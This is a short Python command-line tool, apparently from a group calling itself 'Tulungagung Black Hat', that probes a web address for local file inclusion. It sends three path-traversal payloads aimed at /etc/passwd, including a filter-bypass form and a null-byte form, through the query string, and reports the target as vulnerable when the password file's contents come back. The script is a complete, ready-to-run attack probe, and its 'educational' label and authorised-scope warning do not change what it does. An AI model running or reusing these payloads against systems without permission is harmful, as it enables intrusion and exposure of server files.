#!/usr/bin/env python3
# TBH-LFI - Detector (Educational)
import requests, argparse, json, urllib.parse

BANNER = """\033[91m╔════════════════════════════════════╗
\033[91m║ \033[97mTBH-LFI \033[91m- Detector                \033[91m║
\033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
\033[91m╚════════════════════════════════════╝\033[0m"""

PAYLOADS = ["../../../../etc/passwd","....//....//....//etc/passwd","/etc/passwd%00"]

def check(url):
    parsed=urllib.parse.urlparse(url)
    qs=urllib.parse.parse_qs(parsed.query)
    results=[]
    for payload in PAYLOADS:
        if not qs:
            test_url=f"{url}?file={urllib.parse.quote(payload)}"
        else:
            k=list(qs.keys())[0]
            qs[k]=payload
            test_url=urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)))
        try:
            r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-LFI/1.0'})
            vulnerable="root:" in r.text and "nobody" in r.text
            results.append({"payload":payload,"url":test_url,"status":r.status_code,"vulnerable":vulnerable})
            if vulnerable: break
        except: results.append({"payload":payload,"error":True,"vulnerable":False})
    return results

def main():
    print(BANNER)
    print("\033[91m[!] Hanya untuk scope yang diizinkan!\033[0m\n")
    parser=argparse.ArgumentParser(description="LFI")
    parser.add_argument("-u","--url",required=True)
    parser.add_argument("--json",help="Save JSON")
    args=parser.parse_args()
    print(f"[*] Testing {args.url} dengan 3 payloads LFI")
    results=check(args.url)
    for r in results:
        if r.get("vulnerable"): print(f"\033[91m[!] Vulnerable! {r['payload']} -> {r['url']} [{r['status']}]\033[0m")
        else: print(f"\033[90m[-] {r['payload']} -> {r.get('status','err')} not vulnerable\033[0m")
    if any(x["vulnerable"] for x in results): print("\033[91m[!] Potensi LFI High!\033[0m")
    else: print("\033[92m[✓] Tidak terdeteksi LFI\033[0m")
    if args.json:
        open(args.json,'w').write(json.dumps(results,indent=2)); print(f"[✓] JSON: {args.json}")

if __name__=="__main__": main()
